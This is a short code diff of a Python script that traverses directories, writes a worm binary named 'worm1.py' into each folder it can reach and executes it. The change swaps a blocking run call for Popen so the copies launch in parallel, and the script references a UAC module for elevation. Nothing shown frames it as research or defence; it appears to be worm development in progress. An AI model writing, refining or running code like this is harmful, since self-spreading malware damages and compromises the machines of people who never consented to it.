@@ -1,5 +1,5 @@
 from os import chdir, scandir, getcwd, environ, path as ospath
-from subprocess import run
+from subprocess import Popen
 import UAC
 
 # IF UAC is not given, main-traverse.py will not be executed
@@ -28,7 +28,7 @@ def traverse(path):
         worm_path = ospath.realpath(path)+"\worm1.py"
         with open(worm_path, "wb") as outfile:
             outfile.write(WORM_BIN)
-        run((worm_path), shell=True)   
+        Popen((worm_path), shell=True)   
         
     except PermissionError:
         pass
